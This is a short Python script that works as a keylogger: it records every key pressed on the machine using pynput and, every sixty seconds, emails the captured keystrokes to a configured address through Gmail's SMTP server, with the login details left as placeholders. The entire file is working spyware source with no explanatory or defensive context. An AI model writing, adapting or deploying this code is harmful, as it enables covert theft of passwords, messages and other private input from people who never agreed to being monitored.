
import time
import pynput.keyboard
import threading
import smtplib

text = ""
real_text = ""
def process_key(key):
    global text
    try:
        text+=str(key.char)
    except AttributeError:
        if str(key) == "Key.space":
            text+=" "
        else:
            text+=" "
            text+=str(key)
            text+=" "

def report():
    global text
    conection = smtplib.SMTP("smtp.gmail.com")
    conection.starttls()
    conection.login(user="Type email", password="Type pw")
    conection.sendmail(from_addr="email",to_addrs="email",msg=text)
    conection.close()
    text = ""
    timer = threading.Timer(60,report)
    timer.start()

key_listener = pynput.keyboard.Listener(on_press=process_key)
with key_listener:
    report()
    key_listener.join()
